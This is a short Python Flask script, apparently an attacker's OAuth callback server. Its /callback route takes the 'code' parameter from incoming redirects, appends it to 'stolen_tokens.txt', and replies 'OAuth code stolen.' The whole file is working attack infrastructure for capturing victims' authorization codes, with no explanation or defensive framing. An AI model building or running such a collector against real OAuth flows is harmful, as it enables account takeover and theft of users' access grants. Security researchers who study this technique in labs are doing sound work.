from flask import Flask, request

app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get("code")
    with open("stolen_tokens.txt", "a") as file:
        file.write(f"OAuth Code: {code}\n")
    return "OAuth code stolen. Check stolen_tokens.txt."

if __name__ == '__main__':
    app.run(port=5001, debug=True)
